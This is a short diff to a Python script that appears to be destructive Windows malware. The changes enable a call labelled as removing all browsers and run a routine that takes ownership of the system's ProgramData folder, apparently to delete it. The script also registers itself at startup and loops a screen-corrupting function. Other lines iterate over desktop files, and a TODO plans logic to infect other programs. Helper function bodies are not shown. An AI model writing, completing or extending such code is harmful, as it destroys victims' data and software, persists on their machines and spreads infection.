@@ -27,9 +27,6 @@ if result:
 else:
     print("Error setting ownership.")
 
-
-# The files will be removed automatically.
-# TODO: Implement file removal logic here
 file_path = getDesktopPath()
 file_list = os.listdir(file_path)
 for file_name in file_list:
@@ -42,7 +39,7 @@ for file_name in file_list:
 
 
 default_disk = os.environ['SYSTEMDRIVE']
-#objects.getAllUnifiedObjectsAndDelete()
+objects.getAllUnifiedObjectsAndDelete() # Removing all browsers
 def REMPROM():
     defaultdiskpath = default_disk + "\\ProgramData\\"
     permissions = getOwnerShip(defaultdiskpath)
@@ -67,10 +64,11 @@ def add_to_startup():
 
 
 add_to_startup()
+REMPROM()
 
 while True:
     makeBuggyScreen()
-    REMPROM()
+
 
 
 # TODO: Need to implement a logic to infect programs.
